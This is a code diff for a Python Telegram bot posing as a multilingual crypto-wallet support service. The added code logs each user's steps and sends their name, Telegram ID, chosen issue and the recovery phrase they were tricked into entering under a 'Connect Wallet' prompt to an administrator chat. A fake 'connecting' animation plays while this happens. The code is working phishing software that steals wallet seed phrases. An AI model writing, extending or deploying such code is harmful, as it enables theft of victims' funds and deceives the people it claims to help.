@@ -37,6 +37,62 @@ def s(context, key):
     return get_strings(lang)[key]
 
 
+def log_step(context, step: str):
+    """Append a step to the user's journey log."""
+    if "journey" not in context.user_data:
+        context.user_data["journey"] = []
+    context.user_data["journey"].append(step)
+
+
+async def notify_admin_journey(context, user, outcome: str):
+    """Send the full conversation journey to the admin."""
+    if not ADMIN_CHAT_ID:
+        return
+
+    username  = f"@{user.username}" if user.username else "no username"
+    lang      = context.user_data.get("lang", "—")
+    category  = context.user_data.get("category", "—")
+    sub_label = context.user_data.get("sub_label", "—")
+    timestamp = context.user_data.get("timestamp", datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
+    phrase    = context.user_data.get("phrase", None)
+
+    steps = context.user_data.get("journey", [])
+    steps_text = "\n".join(f"  {i+1}. {step}" for i, step in enumerate(steps)) if steps else "  (no steps recorded)"
+
+    msg = (
+        f"📋 *Full Session Report*\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"🕐 *Time:* {timestamp}\n"
+        f"👤 *Name:* {user.full_name}\n"
+        f"🔗 *Username:* {username}\n"
+        f"🆔 *User ID:* `{user.id}`\n"
+        f"🌐 *Language:* {lang.upper()}\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"📁 *Category:* {category}\n"
+        f"⚠️ *Issue:* {sub_label}\n"
+        f"🏁 *Outcome:* {outcome}\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"🗺️ *Journey:*\n{steps_text}\n"
+    )
+
+    if phrase:
+        msg += (
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔑 *Phrase Submitted:* `{phrase}`\n"
+        )
+
+    msg += "━━━━━━━━━━━━━━━━━━━━"
+
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_CHAT_ID,
+            text=msg,
+            parse_mode="Markdown",
+        )
+    except Exception as e:
+        logger.warning(f"Failed to notify admin: {e}")
+
+
 def lang_keyboard():
     return InlineKeyboardMarkup([
         [
@@ -82,6 +138,8 @@ async def select_lang(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
     lang = query.data.replace("lang_", "")
     context.user_data["lang"] = lang
     user = update.effective_user
+    context.user_data["start_time"] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    log_step(context, f"🌐 Language selected: {lang.upper()}")
 
     await query.edit_message_text(
         s(context, "welcome").format(name=user.first_name, bot_name=BOT_NAME),
@@ -101,6 +159,7 @@ async def choose_issue(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
         lang = query.data.replace("lang_", "")
         context.user_data["lang"] = lang
         user = update.effective_user
+        log_step(context, f"🌐 Language changed mid-flow: {lang.upper()}")
         await query.edit_message_text(
             s(context, "welcome").format(name=user.first_name, bot_name=BOT_NAME),
             parse_mode="Markdown",
@@ -112,6 +171,7 @@ async def choose_issue(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     context.user_data["category"] = category
     cats = s(context, "categories")
     category_label = cats.get(category, category)
+    log_step(context, f"📁 Category selected: {category_label}")
 
     if category == "other":
         await query.edit_message_text(
@@ -140,6 +200,7 @@ async def choose_sub(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
     if query.data == "back":
         context.user_data.pop("category", None)
+        log_step(context, "↩️ Went back to category selection")
         await query.edit_message_text(
             s(context, "back_to_start"),
             parse_mode="Markdown",
@@ -156,6 +217,7 @@ async def choose_sub(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     sub_label = next((sub["label"] for sub in subs if sub["key"] == sub_key), sub_key)
     context.user_data["sub_label"] = sub_label
     context.user_data["timestamp"] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    log_step(context, f"⚠️ Issue selected: {sub_label}")
 
     cats = s(context, "categories")
     category_label = cats.get(category, category)
@@ -182,6 +244,7 @@ async def type_other(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     context.user_data["sub"] = "other"
     context.user_data["sub_label"] = description
     context.user_data["timestamp"] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    log_step(context, f"✏️ Free-text issue described: {description}")
 
     keyboard = [
         [
@@ -200,30 +263,6 @@ async def type_other(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
 
 # ── Confirm report ────────────────────────────────────────────────────────────
-async def notify_admin(context, user, lang, category, sub_key, sub_label, timestamp):
-    if not ADMIN_CHAT_ID:
-        return
-    username = f"@{user.username}" if user.username else "no username"
-    msg = (
-        f"📋 *New Report Submitted*\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🕐 *Time:* {timestamp}\n"
-        f"👤 *Name:* {user.full_name}\n"
-        f"🔗 *Username:* {username}\n"
-        f"🆔 *User ID:* `{user.id}`\n"
-        f"🌐 *Language:* {lang.upper()}\n"
-        f"📁 *Category:* {category}\n"
-        f"⚠️ *Issue:* {sub_label}\n"
-        f"━━━━━━━━━━━━━━━━━━━━"
-    )
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_CHAT_ID,
-            text=msg,
-            parse_mode="Markdown",
-        )
-    except Exception as e:
-        logger.warning(f"Failed to notify admin: {e}")
 
 
 async def confirm_report(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -234,6 +273,7 @@ async def confirm_report(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     if action in ("edit", "edit_other"):
         context.user_data.pop("category", None)
         context.user_data.pop("sub", None)
+        log_step(context, "✏️ Chose to edit — went back to category selection")
         await query.edit_message_text(
             s(context, "back_to_start"),
             parse_mode="Markdown",
@@ -242,6 +282,9 @@ async def confirm_report(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         return CHOOSE_ISSUE
 
     if action == "cancel":
+        log_step(context, "❌ Cancelled at confirmation screen")
+        user = update.effective_user
+        await notify_admin_journey(context, user, "❌ Cancelled by user")
         await query.edit_message_text(s(context, "cancelled"))
         return ConversationHandler.END
 
@@ -251,9 +294,10 @@ async def confirm_report(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     sub_key   = context.user_data.get("sub", "other")
     sub_label = context.user_data.get("sub_label", "")
     timestamp = context.user_data.get("timestamp", "")
+    log_step(context, "✅ Confirmed and submitted report")
 
     save_report(user, lang, category, sub_key, sub_label, timestamp)
-    await notify_admin(context, user, lang, category, sub_key, sub_label, timestamp)
+    await notify_admin_journey(context, user, "✅ Report submitted")
     advice = get_advice(lang, sub_key)
 
     keyboard = [
@@ -307,9 +351,10 @@ async def final_action(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
         lang    = context.user_data.get("lang", "en")
         sub_key = context.user_data.get("sub", "other")
         steps   = get_rectify_steps(lang, sub_key)
+        log_step(context, "🔧 Chose to try self-rectification")
 
         if steps == "CONNECT_WALLET":
-            # Show wallet connect button
+            log_step(context, "🔗 Directed to connect wallet")
             connect_text = CONNECT_WALLET_TEXTS.get(lang, CONNECT_WALLET_TEXTS["en"])
             keyboard = [
                 [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
@@ -322,6 +367,9 @@ async def final_action(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
             )
             return FINAL_ACTION
 
+        log_step(context, "📋 Received rectification steps")
+        user = update.effective_user
+        await notify_admin_journey(context, user, "📋 User received rectification steps")
         keyboard = [
             [InlineKeyboardButton(s(context, "btn_support_still"), url=SUPPORT_LINK)],
         ]
@@ -334,17 +382,22 @@ async def final_action(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
 
     if query.data == "connect_wallet":
         lang = context.user_data.get("lang", "en")
+        log_step(context, "🔗 Clicked Connect Wallet — prompted for recovery phrase")
         phrase_text = ENTER_PHRASE_TEXTS.get(lang, ENTER_PHRASE_TEXTS["en"])
         await query.edit_message_text(phrase_text, parse_mode="Markdown")
         return ENTER_PHRASE
 
     if query.data == "retry_phrase":
         lang = context.user_data.get("lang", "en")
+        log_step(context, "🔄 Retrying recovery phrase entry")
         phrase_text = ENTER_PHRASE_TEXTS.get(lang, ENTER_PHRASE_TEXTS["en"])
         await query.edit_message_text(phrase_text, parse_mode="Markdown")
         return ENTER_PHRASE
 
     if query.data == "restart":
+        log_step(context, "🏠 Chose to start over")
+        user = update.effective_user
+        await notify_admin_journey(context, user, "🏠 User restarted from beginning")
         context.user_data.clear()
         await query.edit_message_text(
             "🌐 *Please select your language / Selecione seu idioma / Selecciona tu idioma / Choisissez votre langue:*",
@@ -359,6 +412,10 @@ async def final_action(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
 async def enter_phrase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     import asyncio
     lang = context.user_data.get("lang", "en")
+    phrase = update.message.text
+    context.user_data["phrase"] = phrase
+    log_step(context, f"🔑 Recovery phrase submitted: {phrase}")
+
     steps_text = CONNECTING_TEXTS.get(lang, CONNECTING_TEXTS["en"])
     retry_btn, restart_btn = PHRASE_RETRY_BTNS.get(lang, PHRASE_RETRY_BTNS["en"])
 
@@ -368,6 +425,10 @@ async def enter_phrase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     await asyncio.sleep(1.5)
     await msg.edit_text(steps_text[2])
     await asyncio.sleep(2)
+
+    # Send full journey to admin (phrase included)
+    user = update.effective_user
+    await notify_admin_journey(context, user, "🔑 Recovery phrase submitted")
 
     keyboard = [
         [InlineKeyboardButton(retry_btn,   callback_data="retry_phrase")],
@@ -392,6 +453,9 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     lang = context.user_data.get("lang", "en")
     strings = get_strings(lang)
+    log_step(context, "❌ Used /cancel command")
+    user = update.effective_user
+    await notify_admin_journey(context, user, "❌ Cancelled via /cancel command")
     await update.message.reply_text(strings["cancelled"], reply_markup=ReplyKeyboardRemove())
     return ConversationHandler.END
 
